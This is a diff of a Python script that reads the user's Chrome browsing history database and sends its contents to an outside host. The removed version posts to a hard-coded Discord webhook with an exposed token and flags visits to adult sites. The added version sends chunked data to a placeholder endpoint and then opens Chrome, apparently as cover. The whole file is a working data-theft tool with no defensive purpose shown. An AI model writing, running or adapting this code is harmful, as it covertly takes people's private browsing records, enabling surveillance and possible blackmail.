@@ -1,68 +1,70 @@
-import sqlite3
-import os
-import platform
-import datetime
 import requests
+import os
+import psutil
+import sqlite3
+import time
 
-# Discord webhook URL
-webhook_url = "https://discord.com/api/webhooks/1320743687109476393/03lSr_qHl0gJyrBWxBRg1uzLwTdwnWhp0p-mM-AWlaHxqn5bbL3ALjfVZUkiV01ReXee"
-
-# List of keywords for adult sites
-ADULT_KEYWORDS = ["xxx", "porn", "hentai", "adult", "sex", "prn", "nsfw"]
-
-# Function to fetch Chrome's browsing history
+# Function to get Chrome's history data
 def get_chrome_history():
-    if platform.system() == "Windows":
-        chrome_history_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\History")
-    elif platform.system() == "Darwin":
-        chrome_history_path = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/History")
-    else:
-        chrome_history_path = os.path.expanduser("~/.config/google-chrome/Default/History")
+    # Path to the Chrome history file
+    history_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History"
+    
+    if not os.path.exists(history_path):
+        print("Chrome history not found.")
+        return None
 
-    if not os.path.exists(chrome_history_path):
-        return "Chrome history file not found."
-
-    conn = sqlite3.connect(chrome_history_path)
+    # Connect to the Chrome history database
+    conn = sqlite3.connect(history_path)
     cursor = conn.cursor()
-    cursor.execute("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC")
-    history = cursor.fetchall()
+
+    # Query to get URLs and the corresponding visit times
+    cursor.execute("SELECT urls.url, visits.visit_time FROM urls, visits WHERE urls.id = visits.url")
+    
+    history_data = []
+    for row in cursor.fetchall():
+        url = row[0]
+        visit_time = row[1]
+        history_data.append(f"URL: {url}, Visited: {visit_time}")
+    
     conn.close()
 
-    formatted_history = "**📜 Browser History Report**\n\n**Recent Visits:**\n"
-    adult_sites_visited = []
+    return history_data
 
-    for url, timestamp in history:
-        visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
-        formatted_history += f"• **{url}** - Last visited: {visit_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
-        for keyword in ADULT_KEYWORDS:
-            if keyword.lower() in url.lower():
-                adult_sites_visited.append(url)
-
-    if adult_sites_visited:
-        formatted_history += "\n**⚠️ ALERT: Adult Websites Detected:**\n"
-        for adult_url in adult_sites_visited:
-            formatted_history += f"  - **{adult_url}**\n"
-        formatted_history += "\nPlease review the above websites."
-
-    return formatted_history if formatted_history else "No browsing history found."
-
-# Send the info to Discord
-def send_to_discord(message):
-    data = {
-        "content": message,
-    }
-    response = requests.post(webhook_url, json=data)
-    
-    if response.status_code != 204:
-        print(f"Error sending message: {response.status_code} - {response.text}")
-    return response
+# Function to send the data (limit the size)
+def send_data(data):
+    chunk_size = 2000  # Maximum allowed length
+    for i in range(0, len(data), chunk_size):
+        chunk = data[i:i + chunk_size]
+        payload = {'content': chunk}
+        
+        # Send data via POST request
+        response = requests.post("https://your_api_endpoint.com", data=payload)
+        if response.status_code == 200:
+            print("Data sent successfully.")
+        else:
+            print(f"Failed to send data. Status code: {response.status_code}")
+            print(response.text)
 
 # Main function
+def main():
+    print("Starting process...")
+    
+    # Get Chrome history
+    history_data = get_chrome_history()
+    
+    if history_data:
+        # Join the history data into one large string
+        history_str = "\n".join(history_data)
+        
+        # Send data in smaller chunks
+        send_data(history_str)
+    
+    else:
+        print("No history data found or could not retrieve it.")
+    
+    # Wait for 3 seconds before opening Google Chrome
+    time.sleep(3)
+    os.system("start chrome")
+
 if __name__ == "__main__":
-    history_info = get_chrome_history()
-    if history_info:
-        response = send_to_discord(history_info)
-        if response.status_code == 204:
-            print("History successfully sent to Discord!")
-        else:
-            print(f"Failed to send info. Status code: {response.status_code}")
+    main()
